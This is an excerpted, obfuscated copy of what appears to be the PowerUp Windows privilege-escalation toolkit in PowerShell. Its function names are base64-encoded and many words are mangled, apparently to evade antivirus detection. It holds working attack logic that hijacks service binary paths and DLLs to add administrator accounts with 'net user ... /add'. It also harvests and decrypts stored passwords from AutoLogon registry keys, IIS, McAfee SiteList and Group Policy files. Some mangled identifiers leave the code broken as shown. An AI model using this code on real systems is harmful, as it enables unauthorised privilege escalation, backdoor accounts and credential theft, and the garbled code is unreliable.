...
function Get-Q3VycmVudFVzZXJUb2tlbkdyb3VwU2lkCg== {
    ...
    $Success = $Advapi32::OpenProcessToken($CurrentProcess, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLast23niWError()
    ...
    if($Success) {
        ...
        $Success = $Advapi32::GetTokenInformation($hProcToken, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLast23niWError()
        ...
        if($Success) {
            ...
            For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                ...
                $SidString = ''
                $Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLast23niWError()
                if($Result -eq 0) {
                    Write-Verbose "Error: $(([ComponentModel.23niWException] $LastError).Message)"
                }
                else {
            ...
            Write-Warning ([ComponentModel.23niWException] $LastError)
        }
...
function Add-U2VydmljZURhY2wK {
    ...
    PROCESS {
        ForEach($ServiceName in $Name) {
            ...
            try {
                Write-Verbose "Add-U2VydmljZURhY2wK IndividualService : $($IndividualService.Name)"
            ...
            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                ...
                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLast23niWError()


                if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
                    $QmluYXJ5Cg==SecurityDescriptor = New-Object Byte[]($SizeNeeded)

                    $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $QmluYXJ5Cg==SecurityDescriptor, $QmluYXJ5Cg==SecurityDescriptor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLast23niWError()

                    if (-not $Result) {
                        Write-Error ([ComponentModel.23niWException] $LastError)
                    }
                    else {
                        $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $QmluYXJ5Cg==SecurityDescriptor, 0
...
function Set-U2VydmljZUJpblBhdGgK {
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                ...
                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$binPath", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLast23niWError()
...
function Test-U2VydmljZURhY2wKPermission {
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            $TargetService = $IndividualService | Add-U2VydmljZURhY2wK
            ...
            if($TargetService -and $TargetService.Dacl) {
                ...
                ForEach($U2VydmljZURhY2wK in $TargetService.Dacl) {
                    if($CurrentUserSids -contains $U2VydmljZURhY2wK.SecurityIdentifier) {

                        if($CheckAllPermissionsInSet) {
                            $AllMatched = $True
                            ForEach($TargetPermission in $TargetPermissions) {

                                if (($U2VydmljZURhY2wK.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
                            ...
                            ForEach($TargetPermission in $TargetPermissions) {
                                ...
                                if (($U2VydmljZURhY2wK.AceType -eq 'AccessAllowed') -and ($U2VydmljZURhY2wK.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
...
function Get-ServiceUnquoted {
    ...
    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {
            ...
            $TW9kaWZpYWJsZQo=Files = $Service.pathname.split(' ') | Get-MdfPth

            $TW9kaWZpYWJsZQo=Files | Where-Object {$_ -and $_.MdfPth -and ($_.MdfPth -ne '')} | Foreach-Object {
                $ServiceRestart = Test-U2VydmljZURhY2wKPermission -PermissionSet 'Restart' -Name $Service.name
                ...
                $Out | Add-Member Noteproperty 'MdfPth' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceQmluYXJ5Cg== -Name '$($Service.name)' -Path <LojohnPath>"
...
function Get-TW9kaWZpYWJsZQo=ServiceFile {
    ...
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
        ...
        $ServicePath | Get-MdfPth | ForEach-Object {

            $ServiceRestart = Test-U2VydmljZURhY2wKPermission -PermissionSet 'Restart' -Name $ServiceName
            ...
            $Out | Add-Member Noteproperty 'TW9kaWZpYWJsZQo=File' $_.MdfPth
            $Out | Add-Member Noteproperty 'TW9kaWZpYWJsZQo=FilePermissions' $_.Permissions
            $Out | Add-Member Noteproperty 'TW9kaWZpYWJsZQo=FileIdentityReference' $_.IdentityReference
            $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceQmluYXJ5Cg== -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
            $Out
        }
    }
...
function Get-TW9kaWZpYWJsZQo=Service {

    [CmdletBinding()] param()

    Get-Service | Test-U2VydmljZURhY2wKPermission -PermissionSet 'ChangeConfig' | ForEach-Object {

        $ServiceDetails = $_ | Get-ServiceDetail

        $ServiceRestart = $_ | Test-U2VydmljZURhY2wKPermission -PermissionSet 'Restart'
        ...
        $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-Aboo -Name '$($ServiceDetails.name)'"
        $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
        $Out
    }
}
    ...
    BEGIN {
        ...
        if($PSBoundParameters['Command']) {
            ...
            if($PSBoundParameters['Credential']) {
                ...
                $pdwToAdd = $Credential.GetNetworkCredential().pdw
            }
            else {
            ...
            if($UserNameToAdd.Contains('\')) {
                ...
                $ServiceCommands = @("net user $UserNameToAdd $pdwToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add")
            }
        }
    }
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            ForEach($ServiceCommand in $ServiceCommands) {
                ...
                $Success = $TargetService | Set-U2VydmljZUJpblBhdGgK -binPath "$ServiceCommand"
            ...
            $Success = $TargetService | Set-U2VydmljZUJpblBhdGgK -binPath "$OriginalServicePath"
            ...
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'Abood' $TargetService.Name
...
function Write-ServiceQmluYXJ5Cg== {
    ...
    BEGIN {
        ...
        if($PSBoundParameters['Command']) {
            ...
            if($UserNameToAdd.Contains('\')) {
                ...
                $ServiceCommand = "net user $UserNameToAdd $pdwToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
            }
        }
    }
    ...
    PROCESS {
        ...
        for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) {
            ...
            $QmluYXJ5Cg==[$i+2458] = $ServiceNameBytes[$i]
        }
        for ($i=0; $i -lt ($CommandBytes.Length); $i++) {

            $QmluYXJ5Cg==[$i+2535] = $CommandBytes[$i]
        }

        Set-Content -Value $QmluYXJ5Cg== -Encoding Byte -Path $Path -Force -ErrorAction Stop
...
function Install-ServiceQmluYXJ5Cg== {
    ...
    PROCESS {
        ...
        $TW9kaWZpYWJsZQo=Files = $ServiceDetails.PathName | Get-MdfPth -LiteralPaths

        if(-not $TW9kaWZpYWJsZQo=Files) {
            throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
        }

        $ServicePath = $TW9kaWZpYWJsZQo=Files | Select-Object -First 1 | Select-Object -ExpandProperty MdfPth
        ...
        $Result = Write-ServiceQmluYXJ5Cg== -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
...
function Restore-ServiceQmluYXJ5Cg== {
...
function Find-ProcessDLLLojohn {
                    ...
                    ForEach ($Module in $LoadedModules){
                        ...
                        if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {
                            ...
                            if (-not $Exclude){
                                ...
                                $Out | Add-Member Noteproperty 'ProcessLojohnableDLL' $ModulePath
                                $Out
                            }
                        }
                    }
...
function Find-PathDLLLojohn {
    ...
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        ...
        $ModifidablePaths = $TargetPath | Get-MdfPth -LiteralPaths | Where-Object {$_ -and ($_ -ne $Null) -and ($_.MdfPth -ne $Null) -and ($_.MdfPth.Trim() -ne '')}
        ForEach($ModifidablePath in $ModifidablePaths) {
            if($ModifidablePath.MdfPth -ne $Null) {
...
function Write-LojohnDll {
    ...
    if($PSBoundParameters['Command']) {
        ...
        if($UserNameToAdd.Contains('\')) {
            ...
            $BatCommand = "net user $UserNameToAdd $pdwToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
        }
    }
    ...
    Write-Verbose "$TargetArchitecture DLL Lojohner written to: $DllPath"
...
function Get-RegistryAutoLogon {
    ...
    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {
        ...
        $Defaultpdw = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Defaultpdw -ErrorAction SilentlyContinue).Defaultpdw
        ...
        $AltDefaultpdw = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultpdw -ErrorAction SilentlyContinue).AltDefaultpdw
        ...
        if ($DefaultUserName -or $AltDefaultUserName) {
            ...
            $Out | Add-Member Noteproperty 'Defaultpdw' $Defaultpdw
            ...
            $Out | Add-Member Noteproperty 'AltDefaultpdw' $AltDefaultpdw
            $Out
        }
    }
}

function Get-TW9kaWZpYWJsZQo=RegistryAutoRun {
    ...
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        ...
        ForEach ($Name in $Keys.GetValueNames()) {
            ...
            $Path | Get-MdfPth | ForEach-Object {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'TW9kaWZpYWJsZQo=File' $_
                $Out
            }
        }
    }
...
function Get-TW9kaWZpYWJsZQo=ScheduledTaskFile {
    ...
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            ...
            if($TaskXML.Task.Triggers) {
                ...
                $TaskXML.Task.Actions.Exec.Command | Get-MdfPth | ForEach-Object {
                    $Out = New-Object PSObject
                ...
                $TaskXML.Task.Actions.Exec.Arguments | Get-MdfPth | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
...
function Get-ApplicationHost {
    ...
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        ...
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {
            ...
            $PoolpdwCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.Pdw"
            $Poolpdw = Invoke-Expression $PoolpdwCmd


            if (($Poolpdw -ne "") -and ($Poolpdw -isnot [system.array])) {

                $Null = $DataTable.Rows.Add($PoolUser, $Poolpdw,'Application Pool','NA',$PoolName)
            }
        }
        ...
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {
            ...
            $VdirpdwCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:Pdw"
            $Vdirpdw = Invoke-Expression $VdirpdwCmd


            if (($Vdirpdw -ne "") -and ($Vdirpdw -isnot [system.array])) {

                $Null = $DataTable.Rows.Add($VdirUser, $Vdirpdw,'Virtual Directory',$VdirName,'NA')
            }
        }
        ...
        if( $DataTable.rows.Count -gt 0 ) {
            ...
            Write-Verbose 'No application pool or virtual directory Pdws were found.'
            $False
        }
    }
    else {
...
function Get-SiteListpdw {
    ...
    BEGIN {
        function Local:Get-DecryptedSitelistpdw {
        ...
        function Local:Get-SitelistFields {
            ...
            try {
                ...
                if($SiteListXml.InnerXml -Like "*Pdw*") {
                    Write-Verbose "Potential Pdw in found in $Path"

                    $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            $pdwRaw = $_.pdw.'#Text'

                            if($_.pdw.Encrypted -eq 1) {

                                $Decpdw = if($pdwRaw) { (Get-DecryptedSitelistpdw -B64Pass $pdwRaw).Decrypted } else {''}
                            }
                            else {
                                $Decpdw = $pdwRaw
                            }
...
function Get-CachedGPPpdw {
    ...
    function local:Get-DecryptedCPdw {
        [CmdletBinding()]
        Param (
            [string] $CPdw 
        )
        ...
        try {
            ...
            switch ($Mod) {
                '1' {$CPdw = $CPdw.Substring(0,$CPdw.Length -1)}
                '2' {$CPdw += ('=' * (4 - $Mod))}
                '3' {$CPdw += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($CPdw)
    ...
    function local:Get-GPPInnerFields {
        ...
        try {
            ...
            if ($Xml.innerxml -like "*cPdw*"){
            
                Write-Verbose "Potential Pdw in $File"
                
                switch ($Filename) {
                    'Groups.xml' {
                        $CPdw += , $Xml | Select-Xml "/Groups/User/Properties/@cPdw" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    ...
                    'Services.xml' {  
                        $CPdw += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cPdw" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $CPdw += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cPdw" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $CPdw += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cPdw" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $CPdw += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cPdw" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $CPdw += , $Xml | Select-Xml "/Drives/Drive/Properties/@cPdw" | Select-Object -Expand Node | ForEach-Object {$_.Value}
           ...
           foreach ($Pass in $CPdw) {
               Write-Verbose "Decrypting $Pass"
               $Decryptedpdw = Get-DecryptedCPdw $Pass
               Write-Verbose "Decrypted a Pdw of $Decryptedpdw"

               $pdw += , $Decryptedpdw
           }
            

            if (-not $pdw) {$pdw = '[BLANK]'}
            if (-not $UserName) {$UserName = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}
                  

            $ObjectProperties = @{'pdws' = $pdw;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
            ...
            Write-Verbose "The Pdw is between {} and may be more than one value."
    ...
    try {
        ...
        if ( -not $XMlFiles ) {
            ...
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain Pdws."
...
function Invoke-Chizzy {
    ...
    if($IsAdmin){
        ...
        $CurrentUserSids = Get-Q3VycmVudFVzZXJUb2tlbkdyb3VwU2lkCg== | Select-Object -ExpandProperty SID
    ...
    $Results = Get-TW9kaWZpYWJsZQo=ServiceFile
    $Results | Format-List
    if($HTMLReport) {
    ...
    $Results = Get-TW9kaWZpYWJsZQo=Service
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>TW9kaWZpYWJsZQo= Services</H2>" | Out-File -Append $HtmlReportFile
    }
    ...
    $Results = Find-PathDLLLojohn
    $Results | Where-Object {$_} | Foreach-Object {
        $AbuseString = "Write-LojohnDll -DllPath '$($_.MdfPth)\wlbsctrl.dll'"
        $_ | Add-Member Noteproperty 'AbuseFunction' $AbuseString
        $_
    } | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>%PATH% .dll Lojohns</H2>" | Out-File -Append $HtmlReportFile
    }
    ...
    if (Get-RegistryAlwaysInstallElevated) {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'AbuseFunction' "Write-AdMss"
        $Results = $Out
    ...
    $Results = Get-TW9kaWZpYWJsZQo=RegistryAutoRun
    $Results | Format-List
    if($HTMLReport) {
    ...
    $Results = Get-TW9kaWZpYWJsZQo=ScheduledTaskFile
    $Results | Format-List
    if($HTMLReport) {
    ...
    "`n`n[*] Checking for encrypted application pool and virtual directory Pdws..."
    $Results = Get-ApplicationHost | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Encrypted Application Pool pdws</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for plaintext Pdws in McAfee SiteList.xml files...."
    $Results = Get-SiteListpdw | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
    ...
    $Results = Get-CachedGPPpdw | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
...
$Types = $FunctionDefinitions | Add-23niWType -Module $Module -Namespace 'PowerUp.NativeMethods'
